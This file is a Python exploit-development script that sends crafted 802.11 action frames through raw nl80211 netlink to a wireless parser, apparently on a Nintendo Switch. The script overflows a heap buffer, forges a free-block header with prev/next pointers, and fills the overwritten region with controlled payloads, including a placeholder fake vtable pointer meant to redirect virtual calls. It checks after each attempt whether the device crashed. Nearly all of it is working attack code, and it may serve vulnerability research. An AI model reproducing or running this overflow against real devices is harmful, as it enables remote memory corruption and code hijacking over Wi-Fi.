#!/usr/bin/env python3
"""Probe the free block's prev/next pointers at parser+0x7AC.

Known header so far:
  magic=0x4652 (FR), attr=0x0001, size=0x0020
  prev=?, next=?

Strategy: write correct magic/attr/size, then test null vs non-null
for prev and next. Also test writing the FULL 0x800 body with the
correct free block header to achieve a non-crashing full overflow.
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_full_overflow_body(used_block_data, free_hdr, post_free_data):
    """Build body_size=0x800 with controlled overflow layout.

    Layout in body:
      [0x000:0x57C] = normal parser data
      [0x57C:0x594] = used block header (18 bytes, zeros/don't care)
      [0x594:0x750] = used block data (0x1BC bytes)
      [0x750:0x768] = free block header (24 bytes)
      [0x768:0x800] = post-free data (0x98 = 152 bytes)
    """
    body_size = 0x800
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    struct.pack_into(">H", body, 0x1DA, 0x0100)  # safe payload_size

    # Used block data at body[0x594:0x750]
    ubd = used_block_data[:0x1BC]
    body[0x594:0x594+len(ubd)] = ubd

    # Free block header at body[0x750:0x768]
    fh = free_hdr[:24]
    body[0x750:0x750+len(fh)] = fh

    # Post-free data at body[0x768:0x800]
    pfd = post_free_data[:0x98]
    body[0x768:0x768+len(pfd)] = pfd

    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def test_body(fam_id, ifindex, name, body, frame_count=80):
    if not check_alive():
        if not wait_alive(30):
            print(f"  {name}: SKIP (Switch unavailable)")
            return None

    frame = build_frame(body)
    for i in range(frame_count):
        err = send_frame(fam_id, ifindex, frame)
        if err != 0:
            break
        time.sleep(0.002)

    time.sleep(3)
    alive1 = check_alive()
    time.sleep(5)
    alive2 = check_alive()
    ping2 = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                            capture_output=True).returncode == 0

    if alive2 and ping2:
        result = "OK"
    elif ping2 and not alive2:
        result = "HTTP_DOWN"
    else:
        result = "CRASH"

    print(f"  {name:50s} → {result}")
    return result


def make_free_hdr(prev=0, next_=0):
    """Build a 24-byte free block header with known correct magic/attr/size."""
    hdr = bytearray(24)
    struct.pack_into("<H", hdr, 0, 0x4652)   # magic FR
    struct.pack_into("<H", hdr, 2, 0x0001)   # attr
    struct.pack_into("<I", hdr, 4, 0x0020)   # size
    struct.pack_into("<Q", hdr, 8, prev)      # prev ptr
    struct.pack_into("<Q", hdr, 16, next_)    # next ptr
    return bytes(hdr)


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")

    results = {}

    # Test 1: Probe prev/next by extending the write to cover them
    # First: just write magic+attr+size (8 bytes at free hdr) + null prev+next
    print("\n" + "="*60)
    print("  PHASE 1: Free block pointer probing")
    print("="*60)

    # Test: body_size that covers free block header completely (24 bytes)
    # body offset 0x750 + 24 = 0x768
    print("\n  Testing body_size=0x768 (write complete free hdr with null ptrs)...")
    body = bytearray(0x768)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, 0x768 - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    struct.pack_into(">H", body, 0x1DA, 0x0100)
    # Write free header at 0x750
    hdr = make_free_hdr(prev=0, next_=0)
    body[0x750:0x768] = hdr
    r = test_body(fam_id, ifindex, "free_hdr_null_ptrs (body=0x768)", bytes(body))
    results["null_ptrs_exact"] = r
    if r != "OK":
        time.sleep(15)
        wait_alive(30)

    # Test: same but extend to 0x800 (also overwrite free data + beyond)
    print("\n  Testing body_size=0x800 with correct free hdr + zero fill...")
    body = build_full_overflow_body(
        used_block_data=bytearray(0x1BC),
        free_hdr=make_free_hdr(prev=0, next_=0),
        post_free_data=bytearray(0x98)
    )
    r = test_body(fam_id, ifindex, "full_0x800_null_ptrs_zero_post", body)
    results["full_null_ptrs_zero_post"] = r
    if r != "OK":
        time.sleep(15)
        wait_alive(30)

    # If that crashed, the problem is in the post-free region.
    # Let's test: exact free hdr size (no post-free overwrite)
    if results.get("full_null_ptrs_zero_post") != "OK":
        print("\n  Full 0x800 crashed → probing post-free boundary...")

        # Binary search: how many bytes PAST the free header can we write?
        # Free block data: 0x20 bytes at parser+0x7C4 to parser+0x7E4
        # After that: parser+0x7E4 (possible next block header)

        for extra in [0, 0x10, 0x20, 0x30, 0x38, 0x40, 0x50, 0x60, 0x80, 0x98]:
            bs = 0x768 + extra
            if bs > 0x800:
                bs = 0x800
            body = bytearray(bs)
            body[0x21] = 0x03
            struct.pack_into(">H", body, 0x22, bs - 0x38)
            body[0x26] = 0x01
            body[0x27] = 0x01
            struct.pack_into(">H", body, 0x1DA, 0x0100)
            hdr = make_free_hdr(prev=0, next_=0)
            body[0x750:0x768] = hdr
            r = test_body(fam_id, ifindex, f"free_hdr+{extra:3d}B_post (body=0x{bs:04x})", bytes(body))
            results[f"post_{extra}"] = r
            if r != "OK":
                print(f"  *** Post-free crash at +{extra} bytes ***")
                time.sleep(15)
                wait_alive(30)
    else:
        print("\n  Full 0x800 with null ptrs + zero fill = OK!")
        print("  We have FULL CONTROL over 0x284 bytes of heap memory!")

        # Now test with controlled payload data
        print("\n" + "="*60)
        print("  PHASE 2: Controlled payload in used block data")
        print("="*60)

        # Write 0x41 pattern to used block data
        body = build_full_overflow_body(
            used_block_data=bytes([0x41] * 0x1BC),
            free_hdr=make_free_hdr(prev=0, next_=0),
            post_free_data=bytearray(0x98)
        )
        r = test_body(fam_id, ifindex, "AAAA_in_used_block (0x1BC bytes)", body)
        results["aaaa_used_block"] = r
        if r != "OK":
            time.sleep(15)
            wait_alive(30)

        # Write incrementing pattern
        body = build_full_overflow_body(
            used_block_data=bytes(range(0x1BC)),
            free_hdr=make_free_hdr(prev=0, next_=0),
            post_free_data=bytearray(0x98)
        )
        r = test_body(fam_id, ifindex, "incrementing_in_used_block", body)
        results["incr_used_block"] = r
        if r != "OK":
            time.sleep(15)
            wait_alive(30)

        # Write a fake vtable pointer at offset 0 of used block data
        # Use a low deterministic address in the .text section
        # (unrelocated 0x7100000000 + low offset within lower 21 bits)
        # This would redirect virtual calls if the used block is an object
        fake_vtable = struct.pack("<Q", 0x0000000000000000)  # null for safety
        payload = bytearray(0x1BC)
        payload[0:8] = fake_vtable
        body = build_full_overflow_body(
            used_block_data=bytes(payload),
            free_hdr=make_free_hdr(prev=0, next_=0),
            post_free_data=bytearray(0x98)
        )
        r = test_body(fam_id, ifindex, "null_vtable_in_used_block", body)
        results["null_vtable_used_block"] = r
        if r != "OK":
            time.sleep(15)
            wait_alive(30)

    # Summary
    print(f"\n{'='*60}")
    print("  RESULTS SUMMARY")
    print(f"{'='*60}")
    for k, v in results.items():
        print(f"  {k:50s} → {v}")

    outfile = str(_LDN_ROOT / "evidence" / "action_frame_overflow" / "freeblock_ptr_probe.json")
    with open(outfile, "w") as f:
        json.dump({
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "free_block": {
                "offset": "parser+0x7AC",
                "magic": "0x4652 (FR)",
                "attr": "0x0001",
                "size": "0x0020",
                "prev": "probing",
                "next": "probing"
            },
            "results": results
        }, f, indent=2)
    print(f"\n  Saved to {outfile}")


if __name__ == "__main__":
    main()
